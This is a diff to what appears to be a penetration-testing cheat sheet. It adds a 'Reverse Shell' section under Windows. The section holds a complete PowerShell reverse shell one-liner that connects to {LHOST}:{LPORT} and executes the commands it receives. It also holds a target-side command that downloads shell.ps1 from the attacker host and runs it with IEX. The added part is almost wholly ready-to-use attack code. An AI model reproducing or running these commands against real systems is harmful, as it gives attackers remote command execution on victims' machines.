@@ -55,6 +55,7 @@
 * [Reverse Engineering](#Reverse-Engineering)
 
 ## Windows
+* [Reverse Shell](#Reverse-Shell)
 * [Windows Password](#Windows-Password)
 * [Pass the Hash Attack](#Pass-the-Hash-Attack)
 * [Kerberos](#Kerberos)
@@ -935,6 +936,19 @@ ltrace {BINARY}
 
 
 
+
+# Reverse Shell
+
+### Powershell
+```
+# cat shell.ps1
+$client = New-Object System.Net.Sockets.TCPClient("{LHOST}",{LPORT});$stream =$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 |Out-String );$sendback2 = $sendback + "# ";$sendbyte =([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+```
+# On Target
+cmd> powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://{LHOST}/shell.ps1\");"
+```
 
 # Windows Password
 
